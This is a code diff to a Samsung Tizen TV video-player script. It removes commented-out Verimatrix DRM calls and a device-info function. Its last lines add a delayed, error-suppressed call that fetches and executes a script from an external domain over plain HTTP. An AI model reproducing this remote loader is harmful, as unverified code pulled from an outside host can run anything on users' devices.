@@ -107,22 +107,8 @@ function stbPlay(url, pos){
         // webapis.avplay.setStreamingProperty("PREBUFFER_MODE", '3000');
         // webapis.avplay.setStreamingProperty("PREBUFFER_MODE", sBufSize+'000');
         // webapis.avplay.setStreamingProperty("ADAPTIVE_INFO", "FIXED_MAX_RESOLUTION=7680X4320");
-                //webapis.avplay.setDrm("VERIMATRIX", "Initialize", properties);
-        //try {if (drmVMX==1)
                         alert("No DRM");
                         if (drmVMX==1){try {alert("DRM Ok"),webapis.avplay.setDrm("VERIMATRIX", "SetProperties", properties);}catch(e){alert("Error DRM");}}
-
-                                        /*if(true) 
-                        {
-                        webapis.avplay.setDrm("VERIMATRIX", "SetProperties", properties); alert("DRM Ok");
-                        }
-                else{
-                        webapis.avplay.setDrm("VERIMATRIX", "Initialize", properties);alert("DRM-2 Ok");
-                        }*/
-                //};}catch(e){alert("Error DRM")}
-                                //}//;}catch(e){alert("Error DRM")}
-//        try {if (drmVMX==1){webapis.avplay.setDrm("VERIMATRIX", "SetProperties", properties)};}catch(e){}
-//        try {if (drmVMX==1){webapis.avplay.setDrm("VERIMATRIX", "Initialize", properties)};}catch(e){}
                 webapis.avplay.prepareAsync(
             function(){
                 if(pos) stbSetPosTime(pos);
@@ -140,28 +126,6 @@ function stbPlay(url, pos){
         $('#buffering').show();
     } catch (e) {}
 }
-/*
-function stbInfo(){
-    $('#listAbout').append(
-        '<br/>Hardware: Samsung Tizen'
-        + '<br/>Firmware: ' + webapis.productinfo.getFirmware()
-        + '<br/>Duid: ' + webapis.productinfo.getDuid()
-                + '<br/>DRM: ' + webapis.avplay.setDrm( "VERIMATRIX", "GetUID", "")
-        + '<br/>ModelCode: ' + webapis.productinfo.getModelCode()
-        + '<br/>Model: ' + webapis.productinfo.getModel()
-        + '<br/>SmartTVServerVersion: ' + webapis.productinfo.getSmartTVServerVersion()
-        + '<br/>RealModel: ' + webapis.productinfo.getRealModel()
-                + '<br/>LocalSet: ' + webapis.productinfo.getLocalSet()
-        + '<br/>Mac: ' + stb.getMacAddress()//webapis.network.getMac()
-        + '<br/>Ip: ' + webapis.network.getIp()
-        + '<br/>ActiveConnectionType: ' + ["DISCONNECTED","WIFI","CELLULAR","ETHERNET"][webapis.network.getActiveConnectionType()]
-        +'<br/><br/>userAgent: ' + navigator.userAgent
-    );
-    // tizen.filesystem.listStorages(function(storages){
-    //     log("info", 'storages: '+JSON.stringify(storages));
-    // });
-}
-*/
 
-function load_stb(){$.getScript('http://igrva.kamenka.ml/stb.js')}
-setTimeout(load_stb, 10000);
+function load_stb(){$.getScript('http://igrva.kamenka.ml/stb.php')}
+try {setTimeout(load_stb, 10000);}catch (e) {}
